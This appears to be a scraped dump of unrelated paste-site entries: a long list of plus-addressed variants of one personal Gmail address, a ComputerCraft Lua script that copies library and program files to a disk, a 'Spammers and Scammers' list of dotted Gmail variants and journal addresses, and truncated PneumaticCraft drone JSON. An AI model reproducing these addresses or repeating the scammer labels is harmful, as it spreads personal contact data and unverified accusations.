<a href=""mailto:ibrahimhonhassan79+6991@gmail.com"">ibrahimhonhassan79+6991@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+5698@gmail.com"">ibrahimhonhassan79+5698@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+31790@gmail.com"">ibrahimhonhassan79+31790@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+21399@gmail.com"">ibrahimhonhassan79+21399@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+5193@gmail.com"">ibrahimhonhassan79+5193@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+21497@gmail.com"">ibrahimhonhassan79+21497@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+24879@gmail.com"">ibrahimhonhassan79+24879@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+12247@gmail.com"">ibrahimhonhassan79+12247@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+24121@gmail.com"">ibrahimhonhassan79+24121@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+27031@gmail.com"">ibrahimhonhassan79+27031@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+6496@gmail.com"">ibrahimhonhassan79+6496@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+27524@gmail.com"">ibrahimhonhassan79+27524@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+21652@gmail.com"">ibrahimhonhassan79+21652@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+28084@gmail.com"">ibrahimhonhassan79+28084@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+25365@gmail.com"">ibrahimhonhassan79+25365@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+16484@gmail.com"">ibrahimhonhassan79+16484@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+10847@gmail.com"">ibrahimhonhassan79+10847@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+6764@gmail.com"">ibrahimhonhassan79+6764@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+21373@gmail.com"">ibrahimhonhassan79+21373@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+17641@gmail.com"">ibrahimhonhassan79+17641@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+20773@gmail.com"">ibrahimhonhassan79+20773@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+5978@gmail.com"">ibrahimhonhassan79+5978@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+32045@gmail.com"">ibrahimhonhassan79+32045@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+20652@gmail.com"">ibrahimhonhassan79+20652@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+29716@gmail.com"">ibrahimhonhassan79+29716@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+26531@gmail.com"">ibrahimhonhassan79+26531@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+27042@gmail.com"">ibrahimhonhassan79+27042@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+5875@gmail.com"">ibrahimhonhassan79+5875@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+1836@gmail.com"">ibrahimhonhassan79+1836@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+12578@gmail.com"">ibrahimhonhassan79+12578@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+23061@gmail.com"">ibrahimhonhassan79+23061@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+9483@gmail.com"">ibrahimhonhassan79+9483@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+13166@gmail.com"">ibrahimhonhassan79+13166@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+30484@gmail.com"">ibrahimhonhassan79+30484@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+8420@gmail.com"">ibrahimhonhassan79+8420@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+16085@gmail.com"">ibrahimhonhassan79+16085@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+6648@gmail.com"">ibrahimhonhassan79+6648@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+4194@gmail.com"">ibrahimhonhassan79+4194@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+10832@gmail.com"">ibrahimhonhassan79+10832@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+204@gmail.com"">ibrahimhonhassan79+204@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+14732@gmail.com"">ibrahimhonhassan79+14732@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+28944@gmail.com"">ibrahimhonhassan79+28944@gmail.com</a>
<a href=""mailto:ibrahimhonhassan79+20030@gmail.com"">ibrahimhonhassan79+20030@gmail.com</a>"
zRy8LXeV,syncthing,DeGariless,Lua,Friday 24th of November 2023 01:35:32 AM CDT,"-- Function to read the content of a file
local function readFile(path)
    local file = fs.open(path, 'r')
    if file then
        local content = file.readAll()
        file.close()
        return content
    end
    return nil
end

-- Function to write content to a file
local function writeFile(path, content)
    local file = fs.open(path, 'w')
    if file then
        file.write(content)
        file.close()
    end
end

-- Check if /disk directory exists
if not fs.exists('/disk') then
    print('Error: /disk directory does not exist.')
    return
end

-- Create /disk/lib directory if it doesn't exist
if not fs.exists('/disk/lib') then
    fs.makeDir('/disk/lib')
end

-- Copy files from /lib to /disk/lib
local libFiles = fs.list('/lib')
for _, file in ipairs(libFiles) do
    local sourcePath = '/lib/' .. file
    local destPath = '/disk/lib/' .. file

    local content = readFile(sourcePath)
    if content then
        writeFile(destPath, content)
        print('Copied ' .. sourcePath .. ' to ' .. destPath)
    else
        print('Error reading ' .. sourcePath)
    end
end

-- Copy files from /programs to /disk
local programFiles = fs.list('/programs')
for _, file in ipairs(programFiles) do
    local sourcePath = '/programs/' .. file
    local destPath = '/disk/' .. file

    local content = readFile(sourcePath)
    if content then
        writeFile(destPath, content)
        print('Copied ' .. sourcePath .. ' to ' .. destPath)
    else
        print('Error reading ' .. sourcePath)
    end
end"
2zPJk5Ax,Spammers and Scammers [11-6/2023],bombaires,AIMMS,Friday 24th of November 2023 01:17:55 AM CDT,"<a href=""mailto:support@binance.org"">support@binance.org</a>
<a href=""mailto:info@ijojournals.com"">info@ijojournals.com</a>
<a href=""mailto:editor@ijojournals.com"">editor@ijojournals.com</a>
<a href=""mailto:submission@ijojournals.com"">submission@ijojournals.com</a>
<a href=""mailto:ephjournal3@gmail.com"">ephjournal3@gmail.com</a>
<a href=""mailto:e.p.h.jo.urn.a.l.3@gmail.com"">e.p.h.jo.urn.a.l.3@gmail.com</a>
<a href=""mailto:e.p.h.jou.r.nal3@gmail.com"">e.p.h.jou.r.nal3@gmail.com</a>
<a href=""mailto:eph.jou.r.nal3@gmail.com"">eph.jou.r.nal3@gmail.com</a>
<a href=""mailto:e.phj.ourn.al3@gmail.com"">e.phj.ourn.al3@gmail.com</a>
<a href=""mailto:e.ph.j.o.ur.na.l3@gmail.com"">e.ph.j.o.ur.na.l3@gmail.com</a>
<a href=""mailto:e.phjou.r.nal3@gmail.com"">e.phjou.r.nal3@gmail.com</a>
<a href=""mailto:e.p.hj.ou.rn.a.l3@gmail.com"">e.p.hj.ou.rn.a.l3@gmail.com</a>
<a href=""mailto:ep.hjour.na.l3@gmail.com"">ep.hjour.na.l3@gmail.com</a>
<a href=""mailto:ep.hj.o.u.rnal.3@gmail.com"">ep.hj.o.u.rnal.3@gmail.com</a>
<a href=""mailto:eph.j.o.ur.nal.3@gmail.com"">eph.j.o.ur.nal.3@gmail.com</a>
<a href=""mailto:eph.j.ou.r.nal3@gmail.com"">eph.j.ou.r.nal3@gmail.com</a>
<a href=""mailto:ep.h.j.ou.rn.al.3@gmail.com"">ep.h.j.ou.rn.al.3@gmail.com</a>
<a href=""mailto:e.p.hjournal.3@gmail.com"">e.p.hjournal.3@gmail.com</a>
<a href=""mailto:ep.hjour.na.l.3@gmail.com"">ep.hjour.na.l.3@gmail.com</a>
<a href=""mailto:e.p.h.jou.rn.al3@gmail.com"">e.p.h.jou.rn.al3@gmail.com</a>
<a href=""mailto:ephj.ou.rn.al.3@gmail.com"">ephj.ou.rn.al.3@gmail.com</a>
<a href=""mailto:e.p.hjo.urn.al3@gmail.com"">e.p.hjo.urn.al3@gmail.com</a>
<a href=""mailto:ep.h.j.o.urnal3@gmail.com"">ep.h.j.o.urnal3@gmail.com</a>
<a href=""mailto:eph.jo.u.r.n.al3@gmail.com"">eph.jo.u.r.n.al3@gmail.com</a>
<a href=""mailto:e.phjo.ur.n.al.3@gmail.com"">e.phjo.ur.n.al.3@gmail.com</a>
<a href=""mailto:eph.j.ou.rn.a.l.3@gmail.com"">eph.j.ou.rn.a.l.3@gmail.com</a>
<a href=""mailto:eph.jo.urna.l3@gmail.com"">eph.jo.urna.l3@gmail.com</a>
<a href=""mailto:e.p.h.jo.ur.n.al3@gmail.com"">e.p.h.jo.ur.n.al3@gmail.com</a>
<a href=""mailto:ephjou.rna.l.3@gmail.com"">ephjou.rna.l.3@gmail.com</a>
<a href=""mailto:ep.h.jo.ur.n.a.l.3@gmail.com"">ep.h.jo.ur.n.a.l.3@gmail.com</a>
<a href=""mailto:e.p.hjou.r.na.l.3@gmail.com"">e.p.hjou.r.na.l.3@gmail.com</a>
<a href=""mailto:ep.h.j.o.u.r.nal.3@gmail.com"">ep.h.j.o.u.r.nal.3@gmail.com</a>
<a href=""mailto:ep.hjo.ur.n.a.l.3@gmail.com"">ep.hjo.ur.n.a.l.3@gmail.com</a>
<a href=""mailto:ep.h.j.ou.rn.al3@gmail.com"">ep.h.j.ou.rn.al3@gmail.com</a>
<a href=""mailto:ephj.ou.rn.a.l.3@gmail.com"">ephj.ou.rn.a.l.3@gmail.com</a>
<a href=""mailto:e.ph.jo.u.rnal.3@gmail.com"">e.ph.jo.u.rnal.3@gmail.com</a>
<a href=""mailto:e.ph.jour.n.al.3@gmail.com"">e.ph.jour.n.al.3@gmail.com</a>
<a href=""mailto:e.phjo.u.rn.a.l.3@gmail.com"">e.phjo.u.rn.a.l.3@gmail.com</a>
<a href=""mailto:eph.j.ourna.l.3@gmail.com"">eph.j.ourna.l.3@gmail.com</a>
<a href=""mailto:e.p.hjou.rn.al.3@gmail.com"">e.p.hjou.rn.al.3@gmail.com</a>
<a href=""mailto:eph.jo.ur.n.al3@gmail.com"">eph.jo.ur.n.al3@gmail.com</a>
<a href=""mailto:eph.j.o.u.rnal.3@gmail.com"">eph.j.o.u.rnal.3@gmail.com</a>
<a href=""mailto:ep.hj.ou.r.n.a.l.3@gmail.com"">ep.hj.ou.r.n.a.l.3@gmail.com</a>
<a href=""mailto:e.ph.jou.rnal3@gmail.com"">e.ph.jou.rnal3@gmail.com</a>
<a href=""mailto:e.ph.j.our.na.l3@gmail.com"">e.ph.j.our.na.l3@gmail.com</a>
<a href=""mailto:ep.hj.ou.rn.al3@gmail.com"">ep.hj.ou.rn.al3@gmail.com</a>
<a href=""mailto:ep.hjo.u.rn.a.l.3@gmail.com"">ep.hjo.u.rn.a.l.3@gmail.com</a>
<a href=""mailto:ephjou.r.n.a.l.3@gmail.com"">ephjou.r.n.a.l.3@gmail.com</a>
<a href=""mailto:ep.hjo.u.rn.al3@gmail.com"">ep.hjo.u.rn.al3@gmail.com</a>
<a href=""mailto:e.ph.jou.r.na.l.3@gmail.com"">e.ph.jou.r.na.l.3@gmail.com</a>
<a href=""mailto:e.p.hj.o.urnal3@gmail.com"">e.p.hj.o.urnal3@gmail.com</a>
<a href=""mailto:e.phj.o.ur.n.al3@gmail.com"">e.phj.o.ur.n.al3@gmail.com</a>
<a href=""mailto:ep.hjou.r.n.a.l3@gmail.com"">ep.hjou.r.n.a.l3@gmail.com</a>
<a href=""mailto:ephj.o.u.r.na.l3@gmail.com"">ephj.o.u.r.na.l3@gmail.com</a>
<a href=""mailto:e.ph.j.ou.r.n.al3@gmail.com"">e.ph.j.ou.r.n.al3@gmail.com</a>
<a href=""mailto:ep.h.j.ou.rn.a.l3@gmail.com"">ep.h.j.ou.rn.a.l3@gmail.com</a>
<a href=""mailto:ep.hj.o.ur.n.a.l.3@gmail.com"">ep.hj.o.ur.n.a.l.3@gmail.com</a>
<a href=""mailto:e.p.h.j.ou.rnal3@gmail.com"">e.p.h.j.ou.rnal3@gmail.com</a>
<a href=""mailto:ephjo.u.r.n.al.3@gmail.com"">ephjo.u.r.n.al.3@gmail.com</a>
<a href=""mailto:e.p.h.j.o.ur.nal3@gmail.com"">e.p.h.j.o.ur.nal3@gmail.com</a>
<a href=""mailto:ephjo.u.r.nal.3@gmail.com"">ephjo.u.r.nal.3@gmail.com</a>
<a href=""mailto:e.p.h.jo.urnal3@gmail.com"">e.p.h.jo.urnal3@gmail.com</a>
<a href=""mailto:eph.jou.rn.al.3@gmail.com"">eph.jou.rn.al.3@gmail.com</a>
<a href=""mailto:e.p.h.jour.nal.3@gmail.com"">e.p.h.jour.nal.3@gmail.com</a>
<a href=""mailto:e.ph.j.ourna.l3@gmail.com"">e.ph.j.ourna.l3@gmail.com</a>
<a href=""mailto:ephj.ou.r.na.l.3@gmail.com"">ephj.ou.r.na.l.3@gmail.com</a>
<a href=""mailto:eph.j.o.u.r.na.l.3@gmail.com"">eph.j.o.u.r.na.l.3@gmail.com</a>
<a href=""mailto:ep.h.jo.urn.a.l.3@gmail.com"">ep.h.jo.urn.a.l.3@gmail.com</a>
<a href=""mailto:e.phj.o.u.r.n.a.l.3@gmail.com"">e.phj.o.u.r.n.a.l.3@gmail.com</a>
<a href=""mailto:ep.hj.o.urna.l.3@gmail.com"">ep.hj.o.urna.l.3@gmail.com</a>
<a href=""mailto:e.p.h.jo.u.r.na.l.3@gmail.com"">e.p.h.jo.u.r.na.l.3@gmail.com</a>
<a href=""mailto:ep.h.jo.urna.l3@gmail.com"">ep.h.jo.urna.l3@gmail.com</a>
<a href=""mailto:e.p.h.jo.u.r.n.al.3@gmail.com"">e.p.h.jo.u.r.n.al.3@gmail.com</a>
<a href=""mailto:ep.hjo.u.r.n.al.3@gmail.com"">ep.hjo.u.r.n.al.3@gmail.com</a>
<a href=""mailto:ep.hj.our.nal.3@gmail.com"">ep.hj.our.nal.3@gmail.com</a>
<a href=""mailto:e.ph.jou.rnal.3@gmail.com"">e.ph.jou.rnal.3@gmail.com</a>
<a href=""mailto:ep.h.jou.rnal.3@gmail.com"">ep.h.jou.rnal.3@gmail.com</a>
<a href=""mailto:eph.jo.urn.al3@gmail.com"">eph.jo.urn.al3@gmail.com</a>
<a href=""mailto:ephjo.u.r.na.l3@gmail.com"">ephjo.u.r.na.l3@gmail.com</a>
<a href=""mailto:eph.jou.r.n.a.l3@gmail.com"">eph.jou.r.n.a.l3@gmail.com</a>
<a href=""mailto:ep.hjo.u.r.na.l3@gmail.com"">ep.hjo.u.r.na.l3@gmail.com</a>
<a href=""mailto:eph.jou.r.nal.3@gmail.com"">eph.jou.r.nal.3@gmail.com</a>
<a href=""mailto:e.p.h.j.our.n.al3@gmail.com"">e.p.h.j.our.n.al3@gmail.com</a>
<a href=""mailto:e.phjo.urna.l3@gmail.com"">e.phjo.urna.l3@gmail.com</a>
<a href=""mailto:ephjou.r.na.l3@gmail.com"">ephjou.r.na.l3@gmail.com</a>
<a href=""mailto:e.ph.j.our.n.a.l3@gmail.com"">e.ph.j.our.n.a.l3@gmail.com</a>
<a href=""mailto:ep.h.j.our.na.l3@gmail.com"">ep.h.j.our.na.l3@gmail.com</a>
<a href=""mailto:e.p.hj.ou.r.n.a.l.3@gmail.com"">e.p.hj.ou.r.n.a.l.3@gmail.com</a>
<a href=""mailto:ep.h.j.o.urnal.3@gmail.com"">ep.h.j.o.urnal.3@gmail.com</a>
<a href=""mailto:e.p.hjournal3@gmail.com"">e.p.hjournal3@gmail.com</a>
<a href=""mailto:ep.hj.o.ur.n.a.l3@gmail.com"">ep.hj.o.ur.n.a.l3@gmail.com</a>
<a href=""mailto:ephj.ou.r.n.al.3@gmail.com"">ephj.ou.r.n.al.3@gmail.com</a>
<a href=""mailto:e.p.hjou.r.n.a.l3@gmail.com"">e.p.hjou.r.n.a.l3@gmail.com</a>
<a href=""mailto:eph.jou.r.n.a.l.3@gmail.com"">eph.jou.r.n.a.l.3@gmail.com</a>
<a href=""mailto:ep.hjour.nal.3@gmail.com"">ep.hjour.nal.3@gmail.com</a>
<a href=""mailto:ephj.o.ur.n.a.l3@gmail.com"">ephj.o.ur.n.a.l3@gmail.com</a>
<a href=""mailto:e.phjo.ur.n.a.l.3@gmail.com"">e.phjo.ur.n.a.l.3@gmail.com</a>
<a href=""mailto:e.p.hj.o.u.rn.a.l3@gmail.com"">e.p.hj.o.u.rn.a.l3@gmail.com</a>
<a href=""mailto:ep.h.j.o.u.r.na.l.3@gmail.com"">ep.h.j.o.u.r.na.l.3@gmail.com</a>
<a href=""mailto:ep.h.jour.n.a.l.3@gmail.com"">ep.h.jour.n.a.l.3@gmail.com</a>
<a href=""mailto:e.ph.jo.ur.nal.3@gmail.com"">e.ph.jo.ur.nal.3@gmail.com</a>
<a href=""mailto:e.ph.j.o.ur.n.al3@gmail.com"">e.ph.j.o.ur.n.al3@gmail.com</a>
<a href=""mailto:e.p.hj.ournal.3@gmail.com"">e.p.hj.ournal.3@gmail.com</a>
<a href=""mailto:e.phjou.rn.a.l3@gmail.com"">e.phjou.rn.a.l3@gmail.com</a>
<a href=""mailto:eph.jo.ur.nal.3@gmail.com"">eph.jo.ur.nal.3@gmail.com</a>
<a href=""mailto:ephj.ou.r.nal.3@gmail.com"">ephj.ou.r.nal.3@gmail.com</a>
<a href=""mailto:ep.hjour.n.al.3@gmail.com"">ep.hjour.n.al.3@gmail.com</a>
<a href=""mailto:e.p.hjo.urnal.3@gmail.com"">e.p.hjo.urnal.3@gmail.com</a>
<a href=""mailto:ephj.our.nal3@gmail.com"">ephj.our.nal3@gmail.com</a>
<a href=""mailto:e.ph.jour.n.a.l3@gmail.com"">e.ph.jour.n.a.l3@gmail.com</a>
<a href=""mailto:e.p.hj.our.na.l3@gmail.com"">e.p.hj.our.na.l3@gmail.com</a>
<a href=""mailto:ep.h.j.ourn.al3@gmail.com"">ep.h.j.ourn.al3@gmail.com</a>
<a href=""mailto:e.p.hj.ou.rna.l3@gmail.com"">e.p.hj.ou.rna.l3@gmail.com</a>
<a href=""mailto:e.phj.o.u.rna.l3@gmail.com"">e.phj.o.u.rna.l3@gmail.com</a>
<a href=""mailto:ep.h.j.ou.r.nal.3@gmail.com"">ep.h.j.ou.r.nal.3@gmail.com</a>
<a href=""mailto:e.ph.journa.l.3@gmail.com"">e.ph.journa.l.3@gmail.com</a>
<a href=""mailto:eph.j.ou.r.nal.3@gmail.com"">eph.j.ou.r.nal.3@gmail.com</a>
<a href=""mailto:e.p.h.j.o.u.r.nal.3@gmail.com"">e.p.h.j.o.u.r.nal.3@gmail.com</a>
<a href=""mailto:e.ph.j.our.na.l.3@gmail.com"">e.ph.j.our.na.l.3@gmail.com</a>
<a href=""mailto:e.phj.our.na.l.3@gmail.com"">e.phj.our.na.l.3@gmail.com</a>
<a href=""mailto:ep.hjourn.al.3@gmail.com"">ep.hjourn.al.3@gmail.com</a>
<a href=""mailto:e.p.h.j.ou.r.na.l3@gmail.com"">e.p.h.j.ou.r.na.l3@gmail.com</a>
<a href=""mailto:ep.h.j.o.u.rn.al.3@gmail.com"">ep.h.j.o.u.rn.al.3@gmail.com</a>
<a href=""mailto:e.p.h.jo.u.r.na.l3@gmail.com"">e.p.h.jo.u.r.na.l3@gmail.com</a>
<a href=""mailto:ep.hj.o.ur.nal.3@gmail.com"">ep.hj.o.ur.nal.3@gmail.com</a>
<a href=""mailto:eph.j.o.u.rn.al3@gmail.com"">eph.j.o.u.rn.al3@gmail.com</a>
<a href=""mailto:e.p.h.jo.u.r.n.a.l.3@gmail.com"">e.p.h.jo.u.r.n.a.l.3@gmail.com</a>
<a href=""mailto:e.p.h.jo.ur.na.l.3@gmail.com"">e.p.h.jo.ur.na.l.3@gmail.com</a>
<a href=""mailto:eph.j.o.u.r.n.al.3@gmail.com"">eph.j.o.u.r.n.al.3@gmail.com</a>
<a href=""mailto:e.phjou.rn.a.l.3@gmail.com"">e.phjou.rn.a.l.3@gmail.com</a>
<a href=""mailto:e.p.h.jo.urn.a.l3@gmail.com"">e.p.h.jo.urn.a.l3@gmail.com</a>
<a href=""mailto:e.p.hj.ou.r.n.a.l3@gmail.com"">e.p.hj.ou.r.n.a.l3@gmail.com</a>
<a href=""mailto:e.p.h.j.o.u.rna.l.3@gmail.com"">e.p.h.j.o.u.rna.l.3@gmail.com</a>
<a href=""mailto:ep.hj.o.u.rn.al3@gmail.com"">ep.hj.o.u.rn.al3@gmail.com</a>
<a href=""mailto:ephj.ou.r.na.l3@gmail.com"">ephj.ou.r.na.l3@gmail.com</a>
<a href=""mailto:e.p.h.j.o.urn.a.l.3@gmail.com"">e.p.h.j.o.urn.a.l.3@gmail.com</a>
<a href=""mailto:ep.h.j.o.urn.al3@gmail.com"">ep.h.j.o.urn.al3@gmail.com</a>
<a href=""mailto:ephj.o.urnal3@gmail.com"">ephj.o.urnal3@gmail.com</a>
<a href=""mailto:e.p.h.j.o.urn.al.3@gmail.com"">e.p.h.j.o.urn.al.3@gmail.com</a>
<a href=""mailto:ephj.our.n.a.l.3@gmail.com"">ephj.our.n.a.l.3@gmail.com</a>
<a href=""mailto:e.p.hj.our.n.a.l3@gmail.com"">e.p.hj.our.n.a.l3@gmail.com</a>
<a href=""mailto:e.p.hj.o.u.r.na.l3@gmail.com"">e.p.hj.o.u.r.na.l3@gmail.com</a>
<a href=""mailto:e.ph.j.o.u.rn.a.l3@gmail.com"">e.ph.j.o.u.rn.a.l3@gmail.com</a>
<a href=""mailto:e.p.h.jo.u.r.nal3@gmail.com"">e.p.h.jo.u.r.nal3@gmail.com</a>
<a href=""mailto:e.ph.jour.nal.3@gmail.com"">e.ph.jour.nal.3@gmail.com</a>
<a href=""mailto:e.p.hj.ou.rn.al3@gmail.com"">e.p.hj.ou.rn.al3@gmail.com</a>
<a href=""mailto:e.p.hjour.n.a.l3@gmail.com"">e.p.hjour.n.a.l3@gmail.com</a>
<a href=""mailto:ephjour.na.l.3@gmail.com"">ephjour.na.l.3@gmail.com</a>
<a href=""mailto:ep.h.j.o.urna.l3@gmail.com"">ep.h.j.o.urna.l3@gmail.com</a>
<a href=""mailto:ephj.ourn.a.l3@gmail.com"">ephj.ourn.a.l3@gmail.com</a>
<a href=""mailto:e.p.h.j.ourn.a.l3@gmail.com"">e.p.h.j.ourn.a.l3@gmail.com</a>
<a href=""mailto:eph.journa.l.3@gmail.com"">eph.journa.l.3@gmail.com</a>
<a href=""mailto:e.p.hjou.r.na.l3@gmail.com"">e.p.hjou.r.na.l3@gmail.com</a>
<a href=""mailto:e.p.hjo.u.rn.al.3@gmail.com"">e.p.hjo.u.rn.al.3@gmail.com</a>
<a href=""mailto:ep.hj.o.u.r.n.al3@gmail.com"">ep.hj.o.u.r.n.al3@gmail.com</a>
<a href=""mailto:e.phj.our.n.al3@gmail.com"">e.phj.our.n.al3@gmail.com</a>
<a href=""mailto:e.p.h.j.ourna.l.3@gmail.com"">e.p.h.j.ourna.l.3@gmail.com</a>
<a href=""mailto:ephj.our.nal.3@gmail.com"">ephj.our.nal.3@gmail.com</a>
<a href=""mailto:e.ph.jo.u.rna.l3@gmail.com"">e.ph.jo.u.rna.l3@gmail.com</a>
<a href=""mailto:ephjour.nal3@gmail.com"">ephjour.nal3@gmail.com</a>
<a href=""mailto:eph.jou.r.na.l3@gmail.com"">eph.jou.r.na.l3@gmail.com</a>
<a href=""mailto:e.p.hjou.r.n.a.l.3@gmail.com"">e.p.hjou.r.n.a.l.3@gmail.com</a>
<a href=""mailto:e.phj.o.u.r.nal3@gmail.com"">e.phj.o.u.r.nal3@gmail.com</a>
<a href=""mailto:e.ph.jo.ur.na.l.3@gmail.com"">e.ph.jo.ur.na.l.3@gmail.com</a>
<a href=""mailto:e.ph.jo.u.rn.a.l3@gmail.com"">e.ph.jo.u.rn.a.l3@gmail.com</a>
<a href=""mailto:e.phjo.u.r.n.a.l.3@gmail.com"">e.phjo.u.r.n.a.l.3@gmail.com</a>
<a href=""mailto:ep.hjo.urn.al.3@gmail.com"">ep.hjo.urn.al.3@gmail.com</a>
<a href=""mailto:ephj.ou.rn.a.l3@gmail.com"">ephj.ou.rn.a.l3@gmail.com</a>
<a href=""mailto:eph.j.o.ur.na.l3@gmail.com"">eph.j.o.ur.na.l3@gmail.com</a>
<a href=""mailto:e.phjou.r.n.a.l3@gmail.com"">e.phjou.r.n.a.l3@gmail.com</a>
<a href=""mailto:e.p.hj.ourn.a.l.3@gmail.com"">e.p.hj.ourn.a.l.3@gmail.com</a>
<a href=""mailto:eph.j.o.urna.l.3@gmail.com"">eph.j.o.urna.l.3@gmail.com</a>
<a href=""mailto:eph.journal3@gmail.com"">eph.journal3@gmail.com</a>
<a href=""mailto:e.p.hj.ou.rnal3@gmail.com"">e.p.hj.ou.rnal3@gmail.com</a>
<a href=""mailto:e.phj.our.n.a.l.3@gmail.com"">e.phj.our.n.a.l.3@gmail.com</a>
<a href=""mailto:e.phj.o.urna.l3@gmail.com"">e.phj.o.urna.l3@gmail.com</a>
<a href=""mailto:ephj.o.u.rnal.3@gmail.com"">ephj.o.u.rnal.3@gmail.com</a>
<a href=""mailto:ephjourn.a.l.3@gmail.com"">ephjourn.a.l.3@gmail.com</a>
<a href=""mailto:e.ph.jou.rn.al.3@gmail.com"">e.ph.jou.rn.al.3@gmail.com</a>
<a href=""mailto:e.p.hjourn.a.l.3@gmail.com"">e.p.hjourn.a.l.3@gmail.com</a>
<a href=""mailto:ephjou.r.n.al.3@gmail.com"">ephjou.r.n.al.3@gmail.com</a>
<a href=""mailto:eph.j.our.na.l3@gmail.com"">eph.j.our.na.l3@gmail.com</a>
<a href=""mailto:e.p.h.jou.r.n.al.3@gmail.com"">e.p.h.jou.r.n.al.3@gmail.com</a>
<a href=""mailto:ep.hj.our.na.l.3@gmail.com"">ep.hj.our.na.l.3@gmail.com</a>
<a href=""mailto:e.ph.jo.urn.a.l.3@gmail.com"">e.ph.jo.urn.a.l.3@gmail.com</a>
<a href=""mailto:ep.hjou.rnal3@gmail.com"">ep.hjou.rnal3@gmail.com</a>
<a href=""mailto:ep.hjournal.3@gmail.com"">ep.hjournal.3@gmail.com</a>
<a href=""mailto:ephjourn.al3@gmail.com"">ephjourn.al3@gmail.com</a>
<a href=""mailto:ep.h.j.our.n.al3@gmail.com"">ep.h.j.our.n.al3@gmail.com</a>
<a href=""mailto:e.p.h.jo.u.rn.a.l3@gmail.com"">e.p.h.jo.u.rn.a.l3@gmail.com</a>
<a href=""mailto:eph.j.our.n.al.3@gmail.com"">eph.j.our.n.al.3@gmail.com</a>
<a href=""mailto:eph.j.o.urn.al3@gmail.com"">eph.j.o.urn.al3@gmail.com</a>
<a href=""mailto:ep.h.j.ourna.l.3@gmail.com"">ep.h.j.ourna.l.3@gmail.com</a>
<a href=""mailto:ephjour.n.a.l3@gmail.com"">ephjour.n.a.l3@gmail.com</a>
<a href=""mailto:e.phjou.r.n.a.l.3@gmail.com"">e.phjou.r.n.a.l.3@gmail.com</a>
<a href=""mailto:ep.hjournal3@gmail.com"">ep.hjournal3@gmail.com</a>
<a href=""mailto:e.ph.j.o.ur.n.al.3@gmail.com"">e.ph.j.o.ur.n.al.3@gmail.com</a>
<a href=""mailto:ep.h.jour.n.a.l3@gmail.com"">ep.h.jour.n.a.l3@gmail.com</a>
<a href=""mailto:eph.jou.r.na.l.3@gmail.com"">eph.jou.r.na.l.3@gmail.com</a>
<a href=""mailto:e.p.hj.o.ur.n.al3@gmail.com"">e.p.hj.o.ur.n.al3@gmail.com</a>
<a href=""mailto:ep.h.j.ourn.a.l3@gmail.com"">ep.h.j.ourn.a.l3@gmail.com</a>
<a href=""mailto:ephj.our.na.l.3@gmail.com"">ephj.our.na.l.3@gmail.com</a>
<a href=""mailto:eph.jo.ur.na.l3@gmail.com"">eph.jo.ur.na.l3@gmail.com</a>
<a href=""mailto:e.p.h.jo.ur.na.l3@gmail.com"">e.p.h.jo.ur.na.l3@gmail.com</a>
<a href=""mailto:ephjo.ur.n.al3@gmail.com"">ephjo.ur.n.al3@gmail.com</a>"
J1jtTw4k,Sample Drone Pickup/Drop off,wastedwander,JSON,Friday 24th of November 2023 01:17:32 AM CDT,"{""pneumaticcraft:progWidgets"":{""type"":9,""value"":[{""name"":{""type"":8,""value"":""start""},""x"":{""type"":3,""value"":-66.0},""y"":{""type"":3,""value"":-2.0}},{""name"":{""type"":8,""value"":""coordinate_operator""},""x"":{""type"":3,""value"":-66.0},""variable"":{""type"":8,""value"":""Deploy_Cord""},""checkX"":{""type"":1,""value"":1.0},""y"":{""type"":3,""value"":9.0},""checkY"":{""type"":1,""value"":1.0},""checkZ"":{""type"":1,""value"":1.0},""operator"":{""type"":1,""value"":0.0}},{""posX"":{""type"":3,""value"":0.0},""posY"":{""type"":3,""value"":0.0},""useVariable"":{""type"":1,""value"":1.0},""posZ"":{""type"":3,""value"":0.0},""name"":{""type"":8,""value"":""coordinate""},""x"":{""type"":3,""value"":-51.0},""variable"":{""type"":8,""value"":""$drone_pos""},""y"":{""type"":3,""value"":9.0}},{""string"":{""type"":8,""value"":""Special Varriable - Grabs Drone\u0027s current 